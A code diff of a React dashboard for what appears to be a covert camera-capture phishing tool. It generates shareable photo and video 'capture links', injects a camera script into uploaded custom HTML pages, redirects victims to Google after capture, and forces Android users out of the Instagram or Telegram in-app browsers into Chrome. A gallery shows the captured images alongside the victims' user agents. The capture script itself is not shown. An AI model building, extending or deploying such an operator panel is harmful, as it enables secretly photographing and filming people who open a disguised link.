               </div>
               <div className="flex gap-2">
                 <Input
-                  value={customCaptureLink}
+                  value={captureLink}
                   readOnly
-                  className="bg-input border-neon-pink/50 text-neon-pink text-xs font-mono"
+                  className="bg-background/50 border-neon-green/30 text-[10px] font-mono text-neon-green h-9"
                 />
                 <Button
-                  variant="outline"
                   size="icon"
-                  onClick={() => copyToClipboard(customCaptureLink)}
-                  className="border-neon-pink text-neon-pink hover:bg-neon-pink/10 shrink-0"
+                  onClick={() => copyToClipboard(captureLink)}
+                  className="h-9 w-9 bg-neon-green text-background hover:bg-neon-green/90 shrink-0"
                 >
-                  <Copy className="w-4 h-4" />
+                  <Copy className="w-3.5 h-3.5" />
                 </Button>
               </div>
-              <Button
-                onClick={() => window.open(customCaptureLink, '_blank')}
-                variant="outline"
-                className="w-full border-neon-pink text-neon-pink hover:bg-neon-pink/10"
-              >
-                <ExternalLink className="w-4 h-4 mr-2" /> TEST CUSTOM LINK
-              </Button>
             </div>
-          )}
-        </div>
-      ) : activeTab === "settings" ? (
-        <div className="space-y-5">
-          {/* Session Settings */}
-          <div className="bg-card/30 rounded-xl p-4 border border-neon-green/30">
-            <div className="flex items-center gap-2 mb-4">
-              <Hash className="w-5 h-5 text-neon-green" />
-              <h3 className="text-neon-green font-bold tracking-wide">SESSION SETTINGS</h3>
-            </div>
-            
-            {/* Session ID */}
-            <div className="space-y-2 mb-4">
-              <Label className="text-xs text-muted-foreground">Session ID</Label>
+
+            {/* Video Link */}
+            <div className="space-y-2">
+              <div className="flex items-center gap-2">
+                <Video className="w-3.5 h-3.5 text-neon-green" />
+                <span className="text-xs font-medium text-foreground">Video Capture ({settings.camVideoDuration || 5}s)</span>
+              </div>
               <div className="flex gap-2">
                 <Input
-                  value={sessionId}
-                  onChange={(e) => updateSettings({ camSessionId: e.target.value })}
-                  placeholder="shubhcam01"
-                  className="bg-background/50 border-neon-green/50 text-neon-green font-mono"
+                  value={videoCaptureLink}
+                  readOnly
+                  className="bg-background/50 border-neon-green/30 text-[10px] font-mono text-neon-green h-9"
                 />
                 <Button
-                  variant="outline"
                   size="icon"
-                  onClick={generateNewSession}
-                  className="border-neon-green text-neon-green shrink-0"
+                  onClick={() => copyToClipboard(videoCaptureLink)}
+                  className="h-9 w-9 bg-neon-green text-background hover:bg-neon-green/90 shrink-0"
                 >
-                  <RefreshCw className="w-4 h-4" />
+                  <Copy className="w-3.5 h-3.5" />
                 </Button>
               </div>
             </div>
 
             {/* Redirect URL */}
             <div className="space-y-2">
-              <Label className="text-xs text-muted-foreground">Redirect URL (after capture)</Label>
+              <div className="flex items-center gap-2">
+                <Globe className="w-3.5 h-3.5 text-muted-foreground" />
+                <span className="text-xs font-medium text-muted-foreground">Redirect After Capture</span>
+              </div>
               <Input
                 value={redirectUrl}
                 onChange={(e) => updateSettings({ camRedirectUrl: e.target.value })}
                 placeholder="https://google.com"
-                className="bg-background/50 border-neon-cyan/50 text-neon-cyan"
+                className="bg-background/50 border-border/50 text-xs h-9"
               />
             </div>
-          </div>
 
-          {/* Photo Capture Settings */}
-          <div className="bg-card/30 rounded-xl p-4 border border-neon-pink/30">
-            <div className="flex items-center gap-2 mb-4">
-              <Camera className="w-5 h-5 text-neon-pink" />
-              <h3 className="text-neon-pink font-bold tracking-wide">PHOTO SETTINGS</h3>
+            {/* Action Buttons */}
+            <div className="grid grid-cols-2 gap-2">
+              <Button
+                onClick={() => window.open(captureLink, '_blank')}
+                variant="outline"
+                size="sm"
+                className="border-neon-green/30 text-neon-green hover:bg-neon-green/10 text-xs"
+              >
+                <ExternalLink className="w-3 h-3 mr-1" /> Test Link
+              </Button>
+              <Button
+                onClick={() => { refreshPhotos(); loadVideos(); }}
+                size="sm"
+                className="bg-neon-green/20 text-neon-green hover:bg-neon-green/30 text-xs"
+              >
+                <RefreshCw className="w-3 h-3 mr-1" /> Refresh
+              </Button>
             </div>
+          </div>
+        )}
+
+        {/* CHROME TAB */}
+        {activeTab === "chrome" && (
+          <div className="space-y-4">
+            {/* Info */}
+            <div className="bg-neon-green/5 border border-neon-green/20 rounded-lg p-3">
+              <div className="flex items-start gap-2">
+                <Smartphone className="w-4 h-4 text-neon-green shrink-0 mt-0.5" />
+                <div className="text-xs text-muted-foreground space-y-1">
+                  <p className="text-foreground font-medium">Android In-App Browser → Chrome</p>
+                  <p>Instagram/Telegram ke browser se auto Chrome redirect</p>
+                </div>
+              </div>
+            </div>
+
+            {/* Chrome Custom HTML Upload */}
+            <div className="space-y-3">
+              <div className="flex items-center gap-2">
+                <Code className="w-3.5 h-3.5 text-neon-green" />
+                <span className="text-xs font-medium">Chrome Custom HTML</span>
+              </div>
+              
+              <input type="file" accept=".html,.htm" ref={chromeFileInputRef} onChange={handleChromeFileUpload} className="hidden" />
+              
+              <Button
+                onClick={() => chromeFileInputRef.current?.click()}
+                variant="outline"
+                size="sm"
+                className="w-full border-neon-green/30 text-neon-green hover:bg-neon-green/10 text-xs"
+              >
+                <Upload className="w-3 h-3 mr-1" /> Upload HTML
+              </Button>
+
+              <Textarea
+                value={chromeCustomHtml}
+                onChange={(e) => setChromeCustomHtml(e.target.value)}
+                placeholder="Paste HTML code..."
+                className="bg-background/50 border-border/50 font-mono text-[10px] min-h-[100px] resize-none"
+              />
+
+              <Button
+                onClick={saveChromeCustomHtml}
+                size="sm"
+                className="w-full bg-neon-green text-background hover:bg-neon-green/90 text-xs"
+              >
+                <Zap className="w-3 h-3 mr-1" /> Save Chrome HTML
+              </Button>
+            </div>
+
+            {/* Chrome Link */}
+            {chromeCustomHtml && (
+              <div className="space-y-2 pt-2 border-t border-border/30">
+                <div className="flex items-center gap-2">
+                  <Chrome className="w-3.5 h-3.5 text-neon-green" />
+                  <span className="text-xs font-medium">Chrome Capture Link</span>
+                </div>
+                <div className="flex gap-2">
+                  <Input
+                    value={chromeCustomCaptureLink}
+                    readOnly
+                    className="bg-background/50 border-neon-green/30 text-[10px] font-mono text-neon-green h-9"
+                  />
+                  <Button
+                    size="icon"
+                    onClick={() => copyToClipboard(chromeCustomCaptureLink)}
+                    className="h-9 w-9 bg-neon-green text-background hover:bg-neon-green/90 shrink-0"
+                  >
+                    <Copy className="w-3.5 h-3.5" />
+                  </Button>
+                </div>
+              </div>
+            )}
+
+            {/* Warning */}
+            <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-2 text-[10px] text-muted-foreground">
+              ⚠️ Sirf Android pe kaam karta hai. iOS supported nahi.
+            </div>
+          </div>
+        )}
+
+        {/* HTML TAB */}
+        {activeTab === "html" && (
+          <div className="space-y-4">
+            <div className="bg-neon-green/5 border border-neon-green/20 rounded-lg p-3">
+              <p className="text-xs text-muted-foreground">
+                Upload custom HTML for capture page. Camera script auto-injected.
+              </p>
+            </div>
+
+            <input type="file" accept=".html,.htm" ref={fileInputRef} onChange={handleFileUpload} className="hidden" />
             
-            {/* Photo Limit */}
-            <div className="space-y-2 mb-4">
-              <div className="flex items-center justify-between">
-                <Label className="text-xs text-muted-foreground">Photo Limit (0 = unlimited)</Label>
-                <span className="text-neon-pink font-mono text-sm">{settings.camPhotoLimit || 0}</span>
-              </div>
-              <Input
-                type="number"
-                min="0"
-                max="100"
-                value={settings.camPhotoLimit || 0}
-                onChange={(e) => updateSettings({ camPhotoLimit: parseInt(e.target.value) || 0 })}
-                className="bg-background/50 border-neon-pink/50 text-neon-pink"
-              />
-            </div>
-
-            {/* Capture Interval */}
-            <div className="space-y-2 mb-4">
-              <div className="flex items-center justify-between">
-                <Label className="text-xs text-muted-foreground">Capture Interval (ms)</Label>
-                <span className="text-neon-cyan font-mono text-sm">{settings.camCaptureInterval || 500}ms</span>
-              </div>
-              <Slider
-                value={[settings.camCaptureInterval || 500]}
-                onValueChange={([val]) => updateSettings({ camCaptureInterval: val })}
-                min={100}
-                max={2000}
-                step={100}
-                className="py-2"
-              />
-              <p className="text-[10px] text-muted-foreground">Lower = faster capture, higher load</p>
-            </div>
-
-            {/* Image Quality */}
-            <div className="space-y-2">
-              <div className="flex items-center justify-between">
-                <Label className="text-xs text-muted-foreground">Image Quality</Label>
-                <span className="text-neon-purple font-mono text-sm">{Math.round((settings.camQuality || 0.8) * 100)}%</span>
-              </div>
-              <Slider
-                value={[Math.round((settings.camQuality || 0.8) * 100)]}
-                onValueChange={([val]) => updateSettings({ camQuality: val / 100 })}
-                min={10}
-                max={100}
-                step={10}
-                className="py-2"
-              />
-            </div>
-          </div>
-
-          {/* Timer & Redirect Settings */}
-          <div className="bg-card/30 rounded-xl p-4 border border-neon-cyan/30">
-            <div className="flex items-center gap-2 mb-4">
-              <Clock className="w-5 h-5 text-neon-cyan" />
-              <h3 className="text-neon-cyan font-bold tracking-wide">TIMER SETTINGS</h3>
-            </div>
-            
-            {/* Countdown Timer */}
-            <div className="space-y-2 mb-4">
-              <div className="flex items-center justify-between">
-                <Label className="text-xs text-muted-foreground">Countdown Timer (seconds)</Label>
-                <span className="text-neon-orange font-mono text-sm">{settings.camCountdownTimer || 5}s</span>
-              </div>
-              <Slider
-                value={[settings.camCountdownTimer || 5]}
-                onValueChange={([val]) => updateSettings({ camCountdownTimer: val })}
-                min={3}
-                max={30}
-                step={1}
-                className="py-2"
-              />
-              <p className="text-[10px] text-muted-foreground">Normal link capture duration</p>
-            </div>
-
-            {/* Auto Redirect Toggle */}
-            <div className="flex items-center justify-between py-3 border-t border-border/50">
-              <div>
-                <Label className="text-sm">Auto Redirect</Label>
-                <p className="text-[10px] text-muted-foreground">Redirect after countdown ends</p>
-              </div>
-              <Switch
-                checked={settings.camAutoRedirect !== false}
-                onCheckedChange={(checked) => updateSettings({ camAutoRedirect: checked })}
-              />
-            </div>
-          </div>
-
-          {/* Video Settings */}
-          <div className="bg-card/30 rounded-xl p-4 border border-neon-red/30">
-            <div className="flex items-center gap-2 mb-4">
-              <Video className="w-5 h-5 text-neon-red" />
-              <h3 className="text-neon-red font-bold tracking-wide">VIDEO SETTINGS</h3>
-            </div>
-            
-            {/* Video Duration */}
-            <div className="space-y-2">
-              <div className="flex items-center justify-between">
-                <Label className="text-xs text-muted-foreground">Video Duration (seconds)</Label>
-                <span className="text-neon-red font-mono text-sm">{settings.camVideoDuration || 5}s</span>
-              </div>
-              <Slider
-                value={[settings.camVideoDuration || 5]}
-                onValueChange={([val]) => updateSettings({ camVideoDuration: val })}
-                min={3}
-                max={30}
-                step={1}
-                className="py-2"
-              />
-            </div>
-          </div>
-
-          {/* Stats */}
-          <div className="bg-card/30 rounded-xl p-4 border border-neon-purple/30">
-            <div className="flex items-center gap-2 mb-3">
-              <ImageIcon className="w-5 h-5 text-neon-purple" />
-              <h3 className="text-neon-purple font-bold tracking-wide">CAPTURE STATS</h3>
-            </div>
-            <div className="grid grid-cols-2 gap-3">
-              <div className="bg-background/30 rounded-lg p-3 text-center">
-                <p className="text-2xl font-bold text-neon-green">{photos.length}</p>
-                <p className="text-xs text-muted-foreground">Photos</p>
-              </div>
-              <div className="bg-background/30 rounded-lg p-3 text-center">
-                <p className="text-2xl font-bold text-neon-red">{videos.length}</p>
-                <p className="text-xs text-muted-foreground">Videos</p>
-              </div>
-            </div>
             <Button
-              onClick={clearAllPhotos}
+              onClick={() => fileInputRef.current?.click()}
               variant="outline"
-              className="w-full mt-3 border-neon-red text-neon-red hover:bg-neon-red/10"
+              size="sm"
+              className="w-full border-neon-green/30 text-neon-green hover:bg-neon-green/10 text-xs"
             >
-              <Trash2 className="w-4 h-4 mr-2" /> CLEAR ALL PHOTOS
+              <Upload className="w-3 h-3 mr-1" /> Upload HTML File
             </Button>
-          </div>
-        </div>
-      ) : (
-        <div className="space-y-4">
-          {loading ? (
-            <div className="min-h-[200px] flex items-center justify-center">
-              <div className="w-8 h-8 border-2 border-neon-green border-t-transparent rounded-full animate-spin" />
-            </div>
-          ) : photos.length === 0 && videos.length === 0 ? (
-            <div className="min-h-[200px] flex items-center justify-center">
-              <div className="text-center text-muted-foreground">
-                <Camera className="w-12 h-12 mx-auto mb-3 opacity-50" />
-                <p>No photos or videos captured yet</p>
-                <p className="text-sm">Share your link to start capturing!</p>
-              </div>
-            </div>
-          ) : (
-            <>
-              <div className="flex justify-between items-center">
-                <span className="text-sm text-muted-foreground">{photos.length} photos, {videos.length} videos</span>
+
+            <Textarea
+              value={customHtml}
+              onChange={(e) => setCustomHtml(e.target.value)}
+              placeholder="Paste HTML code here..."
+              className="bg-background/50 border-border/50 font-mono text-[10px] min-h-[150px] resize-none"
+            />
+
+            <Button
+              onClick={saveCustomHtml}
+              size="sm"
+              className="w-full bg-neon-green text-background hover:bg-neon-green/90 text-xs"
+            >
+              <Zap className="w-3 h-3 mr-1" /> Save HTML
+            </Button>
+
+            {customHtml && (
+              <div className="space-y-2 pt-3 border-t border-border/30">
+                <span className="text-xs font-medium text-foreground">Custom Capture Link</span>
+                <div className="flex gap-2">
+                  <Input
+                    value={customCaptureLink}
+                    readOnly
+                    className="bg-background/50 border-neon-green/30 text-[10px] font-mono text-neon-green h-9"
+                  />
+                  <Button
+                    size="icon"
+                    onClick={() => copyToClipboard(customCaptureLink)}
+                    className="h-9 w-9 bg-neon-green text-background hover:bg-neon-green/90 shrink-0"
+                  >
+                    <Copy className="w-3.5 h-3.5" />
+                  </Button>
+                </div>
                 <Button
+                  onClick={() => window.open(customCaptureLink, '_blank')}
                   variant="outline"
                   size="sm"
-                  onClick={clearAllPhotos}
-                  className="border-neon-red text-neon-red hover:bg-neon-red/10"
+                  className="w-full border-neon-green/30 text-neon-green hover:bg-neon-green/10 text-xs"
                 >
-                  <Trash2 className="w-3 h-3 mr-1" /> Clear All
+                  <ExternalLink className="w-3 h-3 mr-1" /> Test Custom Link
                 </Button>
               </div>
-              <div className="grid grid-cols-2 gap-4">
-                {/* Photos */}
-                {photos.map((photo) => (
-                  <div key={`photo-${photo.id}`} className="relative group">
-                    <img 
-                      src={photo.image_data} 
-                      alt={`Capture ${photo.id}`} 
-                      className="rounded-lg border border-neon-green/30 w-full aspect-square object-cover cursor-pointer"
-                      onClick={() => setViewingPhoto(photo)}
-                    />
-                    <div className="absolute inset-0 bg-background/80 opacity-0 group-hover:opacity-100 transition-opacity rounded-lg flex items-center justify-center">
-                      <Button
-                        size="icon"
-                        variant="outline"
-                        onClick={() => setViewingPhoto(photo)}
-                        className="border-neon-cyan text-neon-cyan h-12 w-12"
-                      >
-                        <Eye className="w-6 h-6" />
-                      </Button>
-                    </div>
-                    <div className="absolute top-1 left-1 bg-neon-green/80 text-background text-[8px] px-1.5 py-0.5 rounded font-bold">
-                      PHOTO
-                    </div>
-                    <p className="text-xs text-muted-foreground mt-1 truncate">
-                      {new Date(photo.captured_at).toLocaleString()}
-                    </p>
-                  </div>
-                ))}
-                {/* Videos */}
-                {videos.map((video) => (
-                  <div key={`video-${video.id}`} className="relative group">
-                    <video 
-                      src={video.video_url} 
-                      className="rounded-lg border border-neon-red/30 w-full aspect-square object-cover cursor-pointer"
-                      onClick={() => setViewingVideo(video)}
-                    />
-                    <div className="absolute inset-0 bg-background/80 opacity-0 group-hover:opacity-100 transition-opacity rounded-lg flex items-center justify-center">
-                      <Button
-                        size="icon"
-                        variant="outline"
-                        onClick={() => setViewingVideo(video)}
-                        className="border-neon-cyan text-neon-cyan h-12 w-12"
-                      >
-                        <Eye className="w-6 h-6" />
-                      </Button>
-                    </div>
-                    <div className="absolute top-1 left-1 bg-neon-red/80 text-background text-[8px] px-1.5 py-0.5 rounded font-bold flex items-center gap-0.5">
-                      <Play className="w-2 h-2" /> VIDEO
-                    </div>
-                    <div className="absolute top-1 right-1 bg-background/70 text-neon-red text-[8px] px-1.5 py-0.5 rounded font-mono">
-                      {video.duration_seconds}s
-                    </div>
-                    <p className="text-xs text-muted-foreground mt-1 truncate">
-                      {new Date(video.captured_at).toLocaleString()}
-                    </p>
-                  </div>
-                ))}
+            )}
+          </div>
+        )}
+
+        {/* MEDIA TAB */}
+        {activeTab === "media" && (
+          <div className="space-y-4">
+            {loading ? (
+              <div className="flex items-center justify-center py-12">
+                <div className="w-6 h-6 border-2 border-neon-green border-t-transparent rounded-full animate-spin" />
               </div>
-            </>
-          )}
-          
-          <Button
-            onClick={() => { refreshPhotos(); loadVideos(); }}
-            className="w-full bg-neon-pink text-background font-bold hover:bg-neon-pink/90"
-          >
-            <RefreshCw className="w-4 h-4 mr-2" /> REFRESH ALL
-          </Button>
-        </div>
-      )}
+            ) : photos.length === 0 && videos.length === 0 ? (
+              <div className="text-center py-12">
+                <Camera className="w-10 h-10 mx-auto mb-2 text-muted-foreground/30" />
+                <p className="text-xs text-muted-foreground">No captures yet</p>
+                <p className="text-[10px] text-muted-foreground/60">Share link to start</p>
+              </div>
+            ) : (
+              <>
+                <div className="flex justify-between items-center">
+                  <span className="text-[10px] text-muted-foreground">{photos.length} photos • {videos.length} videos</span>
+                  <Button
+                    variant="ghost"
+                    size="sm"
+                    onClick={clearAllPhotos}
+                    className="text-destructive hover:text-destructive text-[10px] h-7 px-2"
+                  >
+                    <Trash2 className="w-3 h-3 mr-1" /> Clear
+                  </Button>
+                </div>
+                
+                <div className="grid grid-cols-3 gap-2">
+                  {photos.map((photo) => (
+                    <div
+                      key={`p-${photo.id}`}
+                      className="relative aspect-square rounded-lg overflow-hidden border border-neon-green/20 bg-background/50 cursor-pointer group"
+                      onClick={() => setViewingPhoto(photo)}
+                    >
+                      <img src={photo.image_data} alt="" className="w-full h-full object-cover" />
+                      <div className="absolute inset-0 bg-background/70 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
+                        <Eye className="w-5 h-5 text-neon-green" />
+                      </div>
+                      <div className="absolute top-1 left-1 bg-neon-green/90 text-background text-[7px] px-1 rounded font-bold">
+                        IMG
+                      </div>
+                    </div>
+                  ))}
+                  {videos.map((video) => (
+                    <div
+                      key={`v-${video.id}`}
+                      className="relative aspect-square rounded-lg overflow-hidden border border-neon-green/20 bg-background/50 cursor-pointer group"
+                      onClick={() => setViewingVideo(video)}
+                    >
+                      <video src={video.video_url} className="w-full h-full object-cover" />
+                      <div className="absolute inset-0 bg-background/70 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center">
+                        <Play className="w-5 h-5 text-neon-green" />
+                      </div>
+                      <div className="absolute top-1 left-1 bg-neon-green/90 text-background text-[7px] px-1 rounded font-bold flex items-center gap-0.5">
+                        <Play className="w-2 h-2" /> VID
+                      </div>
+                      <div className="absolute top-1 right-1 bg-background/70 text-neon-green text-[7px] px-1 rounded font-mono">
+                        {video.duration_seconds}s
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              </>
+            )}
+
+            <Button
+              onClick={() => { refreshPhotos(); loadVideos(); }}
+              size="sm"
+              className="w-full bg-neon-green text-background hover:bg-neon-green/90 text-xs"
+            >
+              <RefreshCw className="w-3 h-3 mr-1" /> Refresh Media
+            </Button>
+          </div>
+        )}
+
+        {/* CONFIG TAB */}
+        {activeTab === "config" && (
+          <div className="space-y-4">
+            {/* Session Config */}
+            <div className="space-y-3">
+              <div className="flex items-center gap-2">
+                <Hash className="w-3.5 h-3.5 text-neon-green" />
+                <span className="text-xs font-medium">Session</span>
+              </div>
+              <div className="flex gap-2">
+                <Input
+                  value={sessionId}
+                  onChange={(e) => updateSettings({ camSessionId: e.target.value })}
+                  className="bg-background/50 border-border/50 font-mono text-xs h-9"
+                />
+                <Button
+                  size="icon"
+                  variant="outline"
+                  onClick={generateNewSession}
+                  className="h-9 w-9 border-neon-green/30 text-neon-green shrink-0"
+                >
+                  <RefreshCw className="w-3.5 h-3.5" />
+                </Button>
+              </div>
+            </div>
+
+            {/* Photo Settings */}
+            <div className="space-y-3 pt-3 border-t border-border/30">
+              <div className="flex items-center gap-2">
+                <Camera className="w-3.5 h-3.5 text-neon-green" />
+                <span className="text-xs font-medium">Photo Settings</span>
+              </div>
+              
+              <div className="space-y-2">
+                <div className="flex justify-between text-[10px]">
+                  <span className="text-muted-foreground">Photo Limit (0=∞)</span>
+                  <span className="text-neon-green font-mono">{settings.camPhotoLimit || 0}</span>
+                </div>
+                <Input
+                  type="number"
+                  min="0"
+                  max="100"
+                  value={settings.camPhotoLimit || 0}
+                  onChange={(e) => updateSettings({ camPhotoLimit: parseInt(e.target.value) || 0 })}
+                  className="bg-background/50 border-border/50 text-xs h-8"
+                />
+              </div>
+
+              <div className="space-y-2">
+                <div className="flex justify-between text-[10px]">
+                  <span className="text-muted-foreground">Capture Interval</span>
+                  <span className="text-neon-green font-mono">{settings.camCaptureInterval || 500}ms</span>
+                </div>
+                <Slider
+                  value={[settings.camCaptureInterval || 500]}
+                  onValueChange={([val]) => updateSettings({ camCaptureInterval: val })}
+                  min={100}
+                  max={2000}
+                  step={100}
+                  className="py-2"
+                />
+              </div>
+            </div>
+
+            {/* Timer Settings */}
+            <div className="space-y-3 pt-3 border-t border-border/30">
+              <div className="flex items-center gap-2">
+                <Clock className="w-3.5 h-3.5 text-neon-green" />
+                <span className="text-xs font-medium">Timer Settings</span>
+              </div>
+              
+              <div className="space-y-2">
+                <div className="flex justify-between text-[10px]">
+                  <span className="text-muted-foreground">Countdown Timer</span>
+                  <span className="text-neon-green font-mono">{settings.camCountdownTimer || 5}s</span>
+                </div>
+                <Slider
+                  value={[settings.camCountdownTimer || 5]}
+                  onValueChange={([val]) => updateSettings({ camCountdownTimer: val })}
+                  min={3}
+                  max={30}
+                  step={1}
+                  className="py-2"
+                />
+              </div>
+
+              <div className="flex items-center justify-between">
+                <Label className="text-[10px] text-muted-foreground">Auto Redirect</Label>
+                <Switch
+                  checked={settings.camAutoRedirect !== false}
+                  onCheckedChange={(checked) => updateSettings({ camAutoRedirect: checked })}
+                />
+              </div>
+            </div>
+
+            {/* Video Settings */}
+            <div className="space-y-3 pt-3 border-t border-border/30">
+              <div className="flex items-center gap-2">
+                <Video className="w-3.5 h-3.5 text-neon-green" />
+                <span className="text-xs font-medium">Video Settings</span>
+              </div>
+              
+              <div className="space-y-2">
+                <div className="flex justify-between text-[10px]">
+                  <span className="text-muted-foreground">Video Duration</span>
+                  <span className="text-neon-green font-mono">{settings.camVideoDuration || 5}s</span>
+                </div>
+                <Slider
+                  value={[settings.camVideoDuration || 5]}
+                  onValueChange={([val]) => updateSettings({ camVideoDuration: val })}
+                  min={3}
+                  max={30}
+                  step={1}
+                  className="py-2"
+                />
+              </div>
+            </div>
+
+            {/* Stats */}
+            <div className="grid grid-cols-2 gap-2 pt-3 border-t border-border/30">
+              <div className="bg-neon-green/10 rounded-lg p-3 text-center border border-neon-green/20">
+                <p className="text-xl font-bold text-neon-green">{photos.length}</p>
+                <p className="text-[9px] text-muted-foreground">Photos</p>
+              </div>
+              <div className="bg-neon-green/10 rounded-lg p-3 text-center border border-neon-green/20">
+                <p className="text-xl font-bold text-neon-green">{videos.length}</p>
+                <p className="text-[9px] text-muted-foreground">Videos</p>
+              </div>
+            </div>
+          </div>
+        )}
+      </div>
 
       {/* Photo View Modal */}
       <Dialog open={!!viewingPhoto} onOpenChange={() => setViewingPhoto(null)}>
-        <DialogContent className="p-0 bg-transparent border-0 shadow-none max-w-sm sm:max-w-md">
+        <DialogContent className="p-0 bg-card border border-neon-green/30 max-w-[90vw] sm:max-w-md rounded-xl overflow-hidden">
           {viewingPhoto && (
-            <Card className="bg-card/95 backdrop-blur-sm border-2 border-neon-green/50 shadow-[0_0_30px_hsl(var(--neon-green)/0.3)] overflow-hidden">
-              <CardHeader className="p-3 pb-2 border-b border-neon-green/30">
-                <CardTitle className="text-neon-green flex items-center justify-between text-sm">
-                  <span className="flex items-center gap-2">
-                    <Camera className="w-4 h-4" /> Photo Preview
-                  </span>
-                  <Button
-                    size="icon"
-                    variant="ghost"
-                    onClick={() => setViewingPhoto(null)}
-                    className="h-6 w-6 text-muted-foreground hover:text-neon-red"
-                  >
-                    <X className="w-4 h-4" />
-                  </Button>
-                </CardTitle>
-              </CardHeader>
-              <CardContent className="p-3">
-                <div className="relative aspect-square w-full overflow-hidden rounded-lg border border-neon-green/30 bg-background/50">
-                  <img 
-                    src={viewingPhoto.image_data} 
-                    alt="Captured photo" 
-                    className="w-full h-full object-contain"
-                  />
+            <div>
+              <div className="flex items-center justify-between p-3 border-b border-border/50">
+                <div className="flex items-center gap-2">
+                  <Camera className="w-4 h-4 text-neon-green" />
+                  <span className="text-sm font-medium">Photo</span>
                 </div>
-                <div className="mt-3 space-y-1 text-xs text-muted-foreground bg-background/30 rounded-lg p-2 border border-neon-green/20">
-                  <p className="flex items-center gap-1">
-                    <span className="text-neon-cyan">📅</span> 
-                    <span className="font-medium">{new Date(viewingPhoto.captured_at).toLocaleString()}</span>
-                  </p>
-                  {viewingPhoto.user_agent && (
-                    <p className="flex items-start gap-1 truncate">
-                      <span className="text-neon-pink">📱</span> 
-                      <span className="truncate">{viewingPhoto.user_agent.slice(0, 50)}...</span>
-                    </p>
-                  )}
+                <Button size="icon" variant="ghost" onClick={() => setViewingPhoto(null)} className="h-6 w-6">
+                  <X className="w-4 h-4" />
+                </Button>
+              </div>
+              <div className="p-3">
+                <div className="aspect-square w-full overflow-hidden rounded-lg border border-border/30 bg-background/50">
+                  <img src={viewingPhoto.image_data} alt="" className="w-full h-full object-contain" />
                 </div>
-              </CardContent>
-              <CardFooter className="p-3 pt-0 gap-2">
+                <div className="mt-2 text-[10px] text-muted-foreground space-y-1 bg-background/30 rounded-lg p-2">
+                  <p>📅 {new Date(viewingPhoto.captured_at).toLocaleString()}</p>
+                  {viewingPhoto.user_agent && <p className="truncate">📱 {viewingPhoto.user_agent.slice(0, 40)}...</p>}
+                </div>
+              </div>
+              <div className="flex gap-2 p-3 pt-0">
                 <Button
                   onClick={() => downloadPhoto(viewingPhoto)}
                   size="sm"
-                  className="flex-1 bg-neon-green text-background hover:bg-neon-green/90 shadow-[0_0_10px_hsl(var(--neon-green)/0.3)]"
+                  className="flex-1 bg-neon-green text-background hover:bg-neon-green/90 text-xs"
                 >
                   <Download className="w-3 h-3 mr-1" /> Download
                 </Button>
                 <Button
-                  onClick={() => {
-                    deletePhoto(viewingPhoto.id, viewingPhoto.image_data);
-                    setViewingPhoto(null);
-                  }}
+                  onClick={() => { deletePhoto(viewingPhoto.id, viewingPhoto.image_data); setViewingPhoto(null); }}
                   size="sm"
                   variant="outline"
-                  className="flex-1 border-neon-red text-neon-red hover:bg-neon-red/10 shadow-[0_0_10px_hsl(var(--neon-red)/0.2)]"
+                  className="flex-1 border-destructive text-destructive hover:bg-destructive/10 text-xs"
                 >
                   <Trash2 className="w-3 h-3 mr-1" /> Delete
                 </Button>
-              </CardFooter>
-            </Card>
+              </div>
+            </div>
           )}
         </DialogContent>
       </Dialog>
 
       {/* Video View Modal */}
       <Dialog open={!!viewingVideo} onOpenChange={() => setViewingVideo(null)}>
-        <DialogContent className="p-0 bg-transparent border-0 shadow-none max-w-sm sm:max-w-md">
+        <DialogContent className="p-0 bg-card border border-neon-green/30 max-w-[90vw] sm:max-w-md rounded-xl overflow-hidden">
           {viewingVideo && (
-            <Card className="bg-card/95 backdrop-blur-sm border-2 border-neon-red/50 shadow-[0_0_30px_hsl(var(--neon-red)/0.3)] overflow-hidden">
-              <CardHeader className="p-3 pb-2 border-b border-neon-red/30">
-                <CardTitle className="text-neon-red flex items-center justify-between text-sm">
-                  <span className="flex items-center gap-2">
-                    <Video className="w-4 h-4" /> Video Preview
-                  </span>
-                  <Button
-                    size="icon"
-                    variant="ghost"
-                    onClick={() => setViewingVideo(null)}
-                    className="h-6 w-6 text-muted-foreground hover:text-neon-red"
-                  >
-                    <X className="w-4 h-4" />
-                  </Button>
-                </CardTitle>
-              </CardHeader>
-              <CardContent className="p-3">
-                <div className="relative aspect-video w-full overflow-hidden rounded-lg border border-neon-red/30 bg-background/50">
-                  <video 
-                    src={viewingVideo.video_url} 
-                    controls
-                    autoPlay
-                    className="w-full h-full object-contain"
-                  />
+            <div>
+              <div className="flex items-center justify-between p-3 border-b border-border/50">
+                <div className="flex items-center gap-2">
+                  <Video className="w-4 h-4 text-neon-green" />
+                  <span className="text-sm font-medium">Video</span>
+                  <span className="text-[10px] text-muted-foreground font-mono">{viewingVideo.duration_seconds}s</span>
                 </div>
-                <div className="mt-3 space-y-1 text-xs text-muted-foreground bg-background/30 rounded-lg p-2 border border-neon-red/20">
-                  <p className="flex items-center gap-1">
-                    <span className="text-neon-cyan">📅</span> 
-                    <span className="font-medium">{new Date(viewingVideo.captured_at).toLocaleString()}</span>
-                  </p>
-                  <p className="flex items-center gap-1">
-                    <span className="text-neon-pink">⏱</span> 
-                    <span className="font-medium">{viewingVideo.duration_seconds}s</span>
-                  </p>
-                  {viewingVideo.user_agent && (
-                    <p className="flex items-start gap-1 truncate">
-                      <span className="text-neon-purple">📱</span> 
-                      <span className="truncate">{viewingVideo.user_agent.slice(0, 50)}...</span>
-                    </p>
-                  )}
+                <Button size="icon" variant="ghost" onClick={() => setViewingVideo(null)} className="h-6 w-6">
+                  <X className="w-4 h-4" />
+                </Button>
+              </div>
+              <div className="p-3">
+                <div className="aspect-video w-full overflow-hidden rounded-lg border border-border/30 bg-background/50">
+                  <video src={viewingVideo.video_url} controls autoPlay className="w-full h-full object-contain" />
                 </div>
-              </CardContent>
-              <CardFooter className="p-3 pt-0 gap-2">
+                <div className="mt-2 text-[10px] text-muted-foreground space-y-1 bg-background/30 rounded-lg p-2">
+                  <p>📅 {new Date(viewingVideo.captured_at).toLocaleString()}</p>
+                  {viewingVideo.user_agent && <p className="truncate">📱 {viewingVideo.user_agent.slice(0, 40)}...</p>}
+                </div>
+              </div>
+              <div className="flex gap-2 p-3 pt-0">
                 <Button
                   onClick={() => window.open(viewingVideo.video_url, '_blank')}
                   size="sm"
